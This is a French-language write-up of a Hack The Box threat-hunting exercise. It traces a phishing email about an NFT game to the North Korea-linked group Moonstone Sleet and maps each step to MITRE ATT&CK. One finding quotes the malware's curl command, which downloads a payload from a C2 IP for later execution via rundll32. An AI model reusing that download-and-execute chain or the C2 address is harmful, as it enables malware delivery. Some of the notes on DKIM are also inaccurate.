# Sherlock / Threat Hunting Exercise

**Title: Teamwork**

**Date: 19/09/2025**

**Objective:**
Le but de l’exercice est d'identifier l'action suspect et d'analyser les emails d'aujourd'hui de Jason Longfield.
    - Mapper les attacques et menaces au MITRE ATT&CK Framework
    - Faire l'exercice: **Threat Intelligence Pivoting**
    - Apprendre la recherche sur Menace.

**Environment / Tools Used:**

* HTB Sherlocks
* MITRE ATT&CK, OSINT

**Investigation Steps (short):**

**Findings:**
1. On a trouvé l'email suspect et il a titre comme: `Opportunity to Invest in NFT Game Project.eml`
    - Le problem est que `DKIM`, `DMARC` sont différents. D'abbord, ils sont marqués comme `passed`
    - Mais, basé sur les informations originales du message, on a trouvé que `DKIM` et `DMARC` est marqué comme `none` et il y a un message que:
    - `le message n'est pas signé` et voilà, c'est bizarre dans cette situation.
    - L'email est venu de cette addresse: `<theodore.todtenhaupt@developingdreams.site`

2. Quand on a verifié le domaine sur le `spamhouse.org`: `developingdreams.site`, on a trouvé que ce domaine est crée le `31/01/2025`

3. Selon le MITRE ATT&CK, basé sur le tactic de `Resource Development`, la technique au-dessus a utilisé `T1583.001`: **Acquire Infrastructure: Domains**

4. On a trouvé que le domaine: `developingdreams.site` est associé avec l'entreprise: **Develop_Dreams** on Twitter (X): `https://x.com/Develop_Dreams`.

5. Cette technique au-dessus est associé avec la technique de `Resource Development` dans MITREATT&CK.
    - D'abord, l'attaquant peut creer les comptes sociaux dans les médias sociaux.
    - Cette technique est marqué comme `Establish Accounts` (T1585) et pour les comptes sociaux, cet ID est (T1585.001).
    - L'attaquant utilise normalement cette technique pour cibler les victimes plus tard pendant sa campaigne.

6. Pour trouver les information, on a dû utiliser le `Wayback Machine` car le site n'est pas disponible en moment de notre enquête.
    - Et on a trouvé que le jeu s'appelé `DeTankWar`

7. Et on a utilisé aussi le `Wayback Machine` pour télécharger `zip file` montré dans l'email: `beta_release_v.1.32.exe`:
    - Cela a le hachage (SHA256): `56554117d96d12bd3504ebef2a8f28e790dd1fe583c33ad58ccbf614313ead8c`

8. Selon le MITRE ATT&CK, la technique au-dessus correspond à la tactique: `Resource Development` et
   plus précisement, la technique: `Stage Capabilities`>> **Upload Malware** (T1608.001).

9. Pour trouver le `threat actor`, on a utilisé le mot clé `game` dans MITRE ATT&CK, et le premier résultat était **Moonstone Sleet**
    - Quand on a analysé ce `Threat Actor`, cela a en les action similaires

10. Le pays d'origin est **North Korea**

11. L'autre campaigne de ce `Threat Actor` était avec le logiciel: **PuTTY** (Version de Trojan)

12. La technique au-dessus correspond à la tactique: `Supply Chain Compromise` avec sub-field: `Compromise Software Supply Chain`: **T1195.002**

13. Selon le MITRE ATT&CK, l'autre campaigne futur peut-être avec **npm** paquets.
    - Ce groupe a developé le malware utilisant **npm** paquets pour la livraison.

14. Quand on a cherché sur l'Internet: `Moonstone Sleet` avec supply chain attacks, on a trouvé la source:
    - `https://securitylabs.datadoghq.com/articles/stressed-pungsan-dprk-aligned-threat-actor-leverages-npm-for-initial-access/`
    - Le paquet malveillant de **NMP** était `harthat-hash v1.3.3`

15. Le malware paquet au-dessus a connecté avec C2(IP:142.111.77.196) et a téléchargé `Sprint.dll`

16. Le malware a fait: `curl -o Temp.b -L "http://142.111.77.196/user/user.asp?id=G6A822B" > nul 2>&1`
    - On comprend que il fait une demande pour récupérer **Temp.b** et plus tard, il fait renommer au `package.db` et a utilisé `rundll32.exe`
    - Donc, on connaît que la tactique **Defense Evasion** >> `System Binary Proxy Execution: Rundll32`(T1218.011) a été utilisé ici.


**Key Learning / Takeaway:**
- **DKIM** >> c'est le methodé pour autoriser le contenu: (Domain Keys Identified Email)
    - Il utilise la clé privée pour signer le message et àpres, le récepteur utilise la clé public pour décrypter le message.

- **ARC** >> c'est (Authenticated Received Chain) >> chaque fois qu'un qu'un l'email transite par un
    serveur, le serveur appose un tampon(stamp) d'authentication comme (SPF, DKIM, DMARC)
    - Ces tampons sont stockés dans **ARC** >> et cela aide le prochain serveur à prendre la décision d'accepter ou non cet-email.
    - ARC >> une chaîne d'enregistrements de confiance.

- **PuTTY:** >> émulateur de terminal gratuit et open-source, console série et application de transfert de fichiers réseau

Voilà, ça est y, c'est fini: `https://labs.hackthebox.com/achievement/sherlock/2118023/875`
